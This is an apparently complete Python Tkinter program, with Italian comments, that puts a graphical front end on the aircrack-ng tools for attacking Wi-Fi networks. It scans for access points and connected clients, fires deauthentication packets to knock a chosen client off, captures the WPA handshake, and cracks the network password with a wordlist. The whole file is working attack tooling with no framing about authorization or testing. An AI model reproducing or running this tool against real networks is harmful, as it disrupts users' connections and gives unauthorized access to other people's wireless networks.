import tkinter as tk
from tkinter import ttk, messagebox, filedialog, scrolledtext
import subprocess
import threading
import os
import time
import csv
import glob

# --- CONFIGURAZIONE STORAGE ---
# Ottiene la cartella dove si trova QUESTO script
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
# Crea sottocartella 'captures' se non esiste
CAPTURES_DIR = os.path.join(SCRIPT_DIR, "captures")
if not os.path.exists(CAPTURES_DIR):
    os.makedirs(CAPTURES_DIR)

# File temporanei di sistema solo per lo scanning (questi si possono cancellare)
TEMP_SCAN_DIR = "/tmp/wifi_scan_tmp"
if not os.path.exists(TEMP_SCAN_DIR):
    os.makedirs(TEMP_SCAN_DIR)


COLOR_BG = "#0d0d0d"       
COLOR_FG = "#33ff33"       
COLOR_FG_DIM = "#008f11"   
COLOR_ACCENT = "#ffffff"   
FONT_MAIN = ("Consolas", 10)
FONT_BOLD = ("Consolas", 10, "bold")
FONT_TITLE = ("Consolas", 12, "bold")

class WifiHackerApp:
    def __init__(self, root):
        self.root = root
        self.root.title("/// WIFI_SUITE_V3.0 (PERSISTENT STORAGE) ///")
        self.root.geometry("1250x750")
        self.root.configure(bg=COLOR_BG)
        
        self.setup_style()
        
        # Variabili
        self.interface = tk.StringVar()
        self.mon_interface = ""
        self.target_bssid = tk.StringVar()
        self.target_channel = tk.StringVar()
        self.target_ssid = tk.StringVar(value="NESSUN TARGET")
        self.target_client = tk.StringVar(value="NESSUN CLIENT")
        self.deauth_count = tk.StringVar(value="10")
        self.selected_cap_file = tk.StringVar(value="") # Variabile per il file cap scelto
        
        # Wordlist di default
        default_wordlist = "/usr/share/wordlists/rockyou.txt"
        if not os.path.exists(default_wordlist):
            default_wordlist = "password.lst" 
        self.wordlist_path = tk.StringVar(value=default_wordlist)
        
        # Processi
        self.proc_scan_ap = None
        self.proc_scan_client = None
        self.proc_capture = None
        self.proc_crack = None
        self.stop_scanning_flag = False
        self.stop_client_scan_flag = False
        self.stop_capture_flag = False

        self.create_widgets()
        # Puliamo solo i file di scan temporanei, NON le catture salvate
        self.clean_scan_files() 
        self.detect_interfaces()

    def setup_style(self):
        style = ttk.Style()
        style.theme_use('clam')
        style.configure(".", background=COLOR_BG, foreground=COLOR_FG, font=FONT_MAIN, borderwidth=0)
        style.configure("TLabelframe", background=COLOR_BG, foreground=COLOR_ACCENT, bordercolor=COLOR_FG_DIM)
        style.configure("TLabelframe.Label", background=COLOR_BG, foreground=COLOR_FG, font=FONT_TITLE)
        style.configure("TButton", background="#1a1a1a", foreground=COLOR_FG, bordercolor=COLOR_FG_DIM, focuscolor=COLOR_FG)
        style.map("TButton", background=[("active", "#333333")], foreground=[("active", "#ffffff")])
        style.configure("TEntry", fieldbackground="#1a1a1a", foreground=COLOR_ACCENT, insertcolor=COLOR_FG)
        style.configure("Treeview", background="#000000", foreground=COLOR_FG, fieldbackground="#000000", font=FONT_MAIN)
        style.configure("Treeview.Heading", background="#1a1a1a", foreground=COLOR_ACCENT, font=FONT_BOLD)
        style.map("Treeview", background=[("selected", COLOR_FG_DIM)], foreground=[("selected", "#ffffff")])

    def create_widgets(self):
        main_container = tk.Frame(self.root, bg=COLOR_BG)
        main_container.pack(fill="both", expand=True, padx=10, pady=10)

        # === CONFIGURAZIONE ===
        frame_top = ttk.LabelFrame(main_container, text=" [ CONFIGURAZIONE ] ", padding=10)
        frame_top.pack(fill="x", side="top", pady=(0, 10))
        f_top = tk.Frame(frame_top, bg=COLOR_BG)
        f_top.pack(fill="x")
        
        ttk.Label(f_top, text="INT:").pack(side="left")
        self.combo_iface = ttk.Combobox(f_top, textvariable=self.interface, width=10)
        self.combo_iface.pack(side="left", padx=5)
        self.btn_monitor = ttk.Button(f_top, text="[ ENABLE MON ]", command=self.start_monitor_mode)
        self.btn_monitor.pack(side="left", padx=5)
        
        ttk.Label(f_top, text="| WORDLIST:").pack(side="left", padx=10)
        ttk.Entry(f_top, textvariable=self.wordlist_path, width=30).pack(side="left", padx=5)
        ttk.Button(f_top, text="...", command=self.browse_wordlist, width=3).pack(side="left")

        # === CORPO CENTRALE ===
        body_frame = tk.Frame(main_container, bg=COLOR_BG)
        body_frame.pack(fill="both", expand=True)

        left_col = tk.Frame(body_frame, bg=COLOR_BG)
        left_col.pack(side="left", fill="both", expand=True, padx=(0, 10))

        # 1. SCAN AP
        frame_scan = ttk.LabelFrame(left_col, text=" [ 1. SCAN AP ] ", padding=10)
        frame_scan.pack(fill="both", expand=True, pady=(0, 10))
        btn_f_ap = tk.Frame(frame_scan, bg=COLOR_BG); btn_f_ap.pack(fill="x")
        self.btn_scan_ap = ttk.Button(btn_f_ap, text="> SCAN AP", command=self.toggle_scan_ap, width=15)
        self.btn_scan_ap.pack(side="left")
        
        cols = ("SSID", "BSSID", "CH", "PWR", "ENC")
        self.tree_ap = ttk.Treeview(frame_scan, columns=cols, show="headings", height=5)
        for c in cols: self.tree_ap.heading(c, text=c); self.tree_ap.column(c, width=60)
        self.tree_ap.column("SSID", width=120)
        self.tree_ap.pack(fill="both", expand=True, pady=2)
        self.tree_ap.bind("<<TreeviewSelect>>", self.on_ap_select)

        # 2. TARGET
        frame_target = ttk.LabelFrame(left_col, text=" [ 2. TARGET & CLIENTS ] ", padding=10)
        frame_target.pack(fill="both", expand=True, pady=(0, 10))
        info_f = tk.Frame(frame_target, bg="#111"); info_f.pack(fill="x")
        tk.Label(info_f, textvariable=self.target_ssid, fg=COLOR_ACCENT, bg="#111", font=FONT_BOLD).pack(side="left", padx=5)
        tk.Label(info_f, textvariable=self.target_bssid, fg="gray", bg="#111").pack(side="left", padx=5)
        self.btn_scan_client = ttk.Button(info_f, text="> SCAN CLIENT", command=self.toggle_scan_clients, state="disabled")
        self.btn_scan_client.pack(side="right")
        
        cols_c = ("Station MAC", "PWR", "Pkts")
        self.tree_client = ttk.Treeview(frame_target, columns=cols_c, show="headings", height=4)
        for c in cols_c: self.tree_client.heading(c, text=c)
        self.tree_client.pack(fill="both", expand=True)
        self.tree_client.bind("<<TreeviewSelect>>", self.on_client_select)

        # 3. ATTACK SUITE
        frame_attack = ttk.LabelFrame(left_col, text=" [ 3. ATTACK SUITE ] ", padding=10)
        frame_attack.pack(fill="x")
        f_grid = tk.Frame(frame_attack, bg=COLOR_BG)
        f_grid.pack(fill="x")
        f_grid.columnconfigure(0, weight=1); f_grid.columnconfigure(1, weight=1); f_grid.columnconfigure(2, weight=1)

        # DEAUTH
        p1 = tk.Frame(f_grid, bg=COLOR_BG, bd=1, relief="solid")
        p1.grid(row=0, column=0, sticky="nsew", padx=2)
        tk.Label(p1, text="DEAUTH", fg="red", bg=COLOR_BG, font=FONT_BOLD).pack()
        tk.Label(p1, textvariable=self.target_client, fg="gray", bg=COLOR_BG, font=("Consolas",8)).pack()
        f_d = tk.Frame(p1, bg=COLOR_BG); f_d.pack()
        tk.Label(f_d, text="Pkts:", bg=COLOR_BG).pack(side="left")
        ttk.Entry(f_d, textvariable=self.deauth_count, width=4).pack(side="left")
        self.btn_deauth = ttk.Button(p1, text="FIRE", command=self.run_deauth, state="disabled")
        self.btn_deauth.pack(fill="x", padx=5, pady=5)

        # CAPTURE
        p2 = tk.Frame(f_grid, bg=COLOR_BG, bd=1, relief="solid")
        p2.grid(row=0, column=1, sticky="nsew", padx=2)
        tk.Label(p2, text="CAPTURE (Save to Disk)", fg="orange", bg=COLOR_BG, font=FONT_BOLD).pack()
        self.lbl_hs_status = tk.Label(p2, text="IDLE", fg="gray", bg=COLOR_BG)
        self.lbl_hs_status.pack()
        self.btn_capture = ttk.Button(p2, text="REC .CAP", command=self.toggle_capture, state="disabled")
        self.btn_capture.pack(fill="x", padx=5, pady=5)

        # CRACKING - SELEZIONE MANUALE
        p3 = tk.Frame(f_grid, bg=COLOR_BG, bd=1, relief="solid")
        p3.grid(row=0, column=2, sticky="nsew", padx=2)
        tk.Label(p3, text="CRACKING", fg="yellow", bg=COLOR_BG, font=FONT_BOLD).pack()
        
        # Area selezione file
        f_sel = tk.Frame(p3, bg=COLOR_BG)
        f_sel.pack(fill="x", padx=5)
        self.lbl_cap_name = tk.Label(f_sel, text="Nessun .cap scelto", fg="gray", bg=COLOR_BG, font=("Consolas", 7))
        self.lbl_cap_name.pack(side="top", fill="x")
        ttk.Button(f_sel, text="SCEGLI .CAP", command=self.select_cap_file).pack(side="top", fill="x", pady=2)

        self.btn_crack = ttk.Button(p3, text="START CRACK", command=self.toggle_crack, state="disabled")
        self.btn_crack.pack(fill="x", padx=5, pady=5)

        # LOG
        right_col = ttk.LabelFrame(body_frame, text=" [ LOG ] ", padding=5, width=350)
        right_col.pack(side="right", fill="both", expand=False)
        right_col.pack_propagate(False)
        self.log_text = scrolledtext.ScrolledText(right_col, state="disabled", bg="#000000", fg=COLOR_FG, font=("Consolas", 9))
        self.log_text.pack(fill="both", expand=True)

    # --- UTILS ---
    def log(self, msg):
        self.log_text.config(state="normal")
        self.log_text.insert(tk.END, f"[{time.strftime('%H:%M:%S')}] {msg}\n")
        self.log_text.see(tk.END)
        self.log_text.config(state="disabled")

    def clean_scan_files(self):
        # Pulisce solo i file temporanei di scansione, NON LE CATTURE
        files = glob.glob(f"{TEMP_SCAN_DIR}/*")
        for f in files:
            try: os.remove(f)
            except: pass

    def browse_wordlist(self):
        f = filedialog.askopenfilename(title="Seleziona Wordlist")
        if f: self.wordlist_path.set(f)

    # NUOVA FUNZIONE: Selezione Manuale .CAP
    def select_cap_file(self):
        # Apre di default la cartella captures del progetto
        init_dir = CAPTURES_DIR if os.path.exists(CAPTURES_DIR) else "/"
        f = filedialog.askopenfilename(title="Seleziona file .cap da crackare", 
                                       initialdir=init_dir,
                                       filetypes=[("Cap files", "*.cap"), ("All files", "*.*")])
        if f:
            self.selected_cap_file.set(f)
            self.lbl_cap_name.config(text=os.path.basename(f), fg="white")
            self.btn_crack.config(state="normal")
            self.log(f"File scelto per crack: {os.path.basename(f)}")
        
    def detect_interfaces(self):
        try:
            res = subprocess.check_output("iw dev | awk '$1==\"Interface\"{print $2}'", shell=True).decode()
            ifaces = res.strip().split('\n')
            self.combo_iface['values'] = ifaces
            if ifaces: self.combo_iface.current(0)
            self.log(f"Interfacce: {ifaces}")
        except: self.log("Nessuna interfaccia wifi.")

    def start_monitor_mode(self):
        iface = self.interface.get()
        if not iface: return
        self.log(f"Avvio Monitor su {iface}...")
        def _t():
            subprocess.run(["airmon-ng", "check", "kill"], stdout=subprocess.DEVNULL)
            subprocess.run(["airmon-ng", "start", iface], stdout=subprocess.DEVNULL)
            time.sleep(2)
            res = subprocess.check_output("iw dev | awk '$1==\"Interface\"{print $2}'", shell=True).decode()
            for i in res.strip().split('\n'):
                if "mon" in i or i != iface:
                    self.mon_interface = i
                    break
            if not self.mon_interface: self.mon_interface = iface
            self.root.after(0, lambda: self.log(f"Monitor Mode: {self.mon_interface}"))
            self.root.after(0, lambda: self.btn_monitor.config(state="disabled"))
        threading.Thread(target=_t, daemon=True).start()

    # --- SCAN AP ---
    def toggle_scan_ap(self):
        if not self.proc_scan_ap:
            if not self.mon_interface:
                messagebox.showerror("!", "Attiva prima Monitor Mode")
                return
            self.log("Scansione AP in corso...")
            self.btn_scan_ap.config(text="STOP SCAN")
            self.tree_ap.delete(*self.tree_ap.get_children())
            
            # File temporaneo per la GUI
            self.scan_ap_file = os.path.join(TEMP_SCAN_DIR, "scan_ap")
            self.clean_scan_files()
            
            cmd = ["airodump-ng", "--write", self.scan_ap_file, "--output-format", "csv", self.mon_interface]
            self.proc_scan_ap = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            self.stop_scanning_flag = False
            threading.Thread(target=self.update_ap_list, daemon=True).start()
        else:
            self.proc_scan_ap.terminate()
            self.proc_scan_ap = None
            self.stop_scanning_flag = True
            self.btn_scan_ap.config(text="> SCAN AP")
            self.log("Scan AP fermato.")

    def update_ap_list(self):
        csv_f = self.scan_ap_file + "-01.csv"
        while not self.stop_scanning_flag:
            if os.path.exists(csv_f):
                try:
                    with open(csv_f, 'r', encoding='utf-8', errors='ignore') as f:
                        reader = csv.reader(f)
                        rows = list(reader)
                        found_aps = []
                        for row in rows:
                            if not row or len(row) < 14: continue
                            if row[0].strip() == "BSSID": continue
                            if row[0].strip() == "Station MAC": break
                            found_aps.append((row[13].strip(), row[0].strip(), row[3].strip(), row[8].strip(), row[5].strip()))
                        self.root.after(0, lambda aps=found_aps: self._refresh_ap(aps))
                except: pass
            time.sleep(1)

    def _refresh_ap(self, aps):
        self.tree_ap.delete(*self.tree_ap.get_children())
        for ap in aps: self.tree_ap.insert("", "end", values=ap)

    def on_ap_select(self, event):
        sel = self.tree_ap.selection()
        if sel:
            vals = self.tree_ap.item(sel[0])['values']
            self.target_ssid.set(vals[0])
            self.target_bssid.set(vals[1])
            self.target_channel.set(vals[2])
            self.btn_scan_client.config(state="normal")
            self.btn_capture.config(state="normal")
            self.log(f"Target impostato: {vals[0]} (CH {vals[2]})")
            subprocess.run(["iwconfig", self.mon_interface, "channel", str(vals[2])])

    # --- SCAN CLIENT ---
    def toggle_scan_clients(self):
        if not self.proc_scan_client:
            if self.proc_scan_ap: self.toggle_scan_ap()
            self.log(f"Cerca clienti su {self.target_ssid.get()}...")
            self.btn_scan_client.config(text="STOP")
            self.tree_client.delete(*self.tree_client.get_children())
            
            self.scan_client_file = os.path.join(TEMP_SCAN_DIR, "scan_client")
            # Pulisce vecchi file client temp
            for f in glob.glob(self.scan_client_file + "*"): os.remove(f)
            
            cmd = ["airodump-ng", "--bssid", self.target_bssid.get(), "--channel", self.target_channel.get(), 
                   "--write", self.scan_client_file, "--output-format", "csv", self.mon_interface]
            self.proc_scan_client = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            self.stop_client_scan_flag = False
            threading.Thread(target=self.update_client_list, daemon=True).start()
        else:
            self.proc_scan_client.terminate()
            self.proc_scan_client = None
            self.stop_client_scan_flag = True
            self.btn_scan_client.config(text="> SCAN CLIENT")

    def update_client_list(self):
        csv_f = self.scan_client_file + "-01.csv"
        while not self.stop_client_scan_flag:
            if os.path.exists(csv_f):
                try:
                    with open(csv_f, 'r', encoding='utf-8', errors='ignore') as f:
                        lines = f.readlines()
                        clients = []
                        section = False
                        for line in lines:
                            if "Station MAC" in line: section = True; continue
                            if section and line.strip():
                                p = line.split(',')
                                if len(p) >= 6: clients.append((p[0].strip(), p[3].strip(), p[4].strip()))
                        self.root.after(0, lambda c=clients: self._refresh_client(c))
                except: pass
            time.sleep(1)

    def _refresh_client(self, clients):
        self.tree_client.delete(*self.tree_client.get_children())
        for c in clients: self.tree_client.insert("", "end", values=c)

    def on_client_select(self, event):
        sel = self.tree_client.selection()
        if sel:
            self.target_client.set(self.tree_client.item(sel[0])['values'][0])
            self.btn_deauth.config(state="normal")

    # --- DEAUTH ---
    def run_deauth(self):
        self.log(f"Deauth -> {self.target_client.get()}")
        def _d():
            subprocess.run(["aireplay-ng", "-0", self.deauth_count.get(), "-a", self.target_bssid.get(), 
                            "-c", self.target_client.get(), self.mon_interface], stdout=subprocess.PIPE)
            self.root.after(0, lambda: self.log("Deauth inviato."))
        threading.Thread(target=_d, daemon=True).start()

    # --- CAPTURE CON SALVATAGGIO PERMANENTE ---
    def toggle_capture(self):
        if not self.proc_capture:
            # Crea un nome file UNIVOCO basato sul tempo
            timestamp = time.strftime("%Y%m%d_%H%M%S")
            safe_ssid = self.target_ssid.get().replace(" ", "_").replace("'", "")
            filename = f"capture_{safe_ssid}_{timestamp}"
            self.cap_prefix = os.path.join(CAPTURES_DIR, filename)
            
            self.log(f"Salvataggio in: {filename}-01.cap")
            self.btn_capture.config(text="STOP REC")
            self.lbl_hs_status.config(text="RECORDING...", fg="orange")
            
            cmd = ["airodump-ng", "--bssid", self.target_bssid.get(), "--channel", self.target_channel.get(),
                   "--write", self.cap_prefix, self.mon_interface]
            self.proc_capture = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            self.stop_capture_flag = False
            threading.Thread(target=self.check_hs, daemon=True).start()
        else:
            self.proc_capture.terminate()
            self.proc_capture = None
            self.stop_capture_flag = True
            self.btn_capture.config(text="REC .CAP")
            self.lbl_hs_status.config(text="SAVED", fg=COLOR_FG)
            self.log("Cattura salvata nella cartella 'captures'.")

    def check_hs(self):
        while not self.stop_capture_flag:
            time.sleep(3)
            # Airodump aggiunge -01.cap
            files = glob.glob(self.cap_prefix + "*.cap")
            if files:
                try:
                    out = subprocess.check_output(["aircrack-ng", files[0]], stderr=subprocess.STDOUT).decode()
                    if "(1 handshake)" in out:
                        self.root.after(0, self.hs_found)
                        break
                except: pass

    def hs_found(self):
        self.lbl_hs_status.config(text="HANDSHAKE SAVED!", fg=COLOR_FG, font=FONT_BOLD)
        self.log("!!! HANDSHAKE CATTURATO E SALVATO !!!")
        messagebox.showinfo("OK", "Handshake Catturato! Il file è salvo nella cartella captures.")
        # Non abilito crack automatico, l'utente deve sceglierlo

    # --- CRACKING MANUALE ---
    def toggle_crack(self):
        if not self.proc_crack:
            wlist = self.wordlist_path.get()
            cap_file = self.selected_cap_file.get()
            
            if not cap_file or not os.path.exists(cap_file):
                messagebox.showerror("Errore", "Seleziona prima un file .cap valido!")
                return
            
            # File temporaneo per l'output della chiave
            self.key_file_out = os.path.join(TEMP_SCAN_DIR, "cracked_key.txt")
            if os.path.exists(self.key_file_out): os.remove(self.key_file_out)
            
            self.log(f"Cracking su {os.path.basename(cap_file)}...")
            self.btn_crack.config(text="STOP", state="normal")
            
            # Nota: non serve -b se il cap ha un solo target pulito, ma lo mettiamo se c'è
            cmd = ["aircrack-ng", "-w", wlist, "-l", self.key_file_out, cap_file]
            # Se abbiamo un target bssid selezionato, aggiungiamolo per sicurezza
            if self.target_bssid.get():
                cmd.extend(["-b", self.target_bssid.get()])
            
            def _c():
                self.proc_crack = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                
                found_key = None
                while self.proc_crack.poll() is None:
                    if os.path.exists(self.key_file_out) and os.path.getsize(self.key_file_out) > 0:
                        with open(self.key_file_out, 'r') as kf:
                            found_key = kf.read().strip()
                        if found_key:
                            self.proc_crack.terminate()
                            break
                    time.sleep(1)
                
                if not found_key and os.path.exists(self.key_file_out) and os.path.getsize(self.key_file_out) > 0:
                     with open(self.key_file_out, 'r') as kf: found_key = kf.read().strip()

                self.proc_crack = None
                self.root.after(0, lambda: self.btn_crack.config(text="START CRACK"))
                
                if found_key:
                    self.root.after(0, lambda k=found_key: self.crack_success(k))
                else:
                    self.root.after(0, lambda: self.log("Password non trovata."))

            threading.Thread(target=_c, daemon=True).start()
        else:
            self.proc_crack.terminate()
            self.proc_crack = None
            self.btn_crack.config(text="START CRACK")

    def crack_success(self, key):
        self.log(f"PASSWORD TROVATA: {key}")
        top = tk.Toplevel(self.root)
        top.geometry("400x200"); top.configure(bg="black")
        tk.Label(top, text="PASSWORD FOUND!", fg="red", bg="black", font=("Consolas", 16)).pack(pady=20)
        t = tk.Entry(top, font=("Consolas", 14), justify='center', bg="#111", fg="#0f0"); t.insert(0, key); t.pack()
        tk.Button(top, text="CLOSE", command=top.destroy).pack(pady=10)

if __name__ == "__main__":
    if os.geteuid() != 0:
        print("Serve root!")
        exit(1)
    root = tk.Tk()
    app = WifiHackerApp(root)
    root.mainloop()
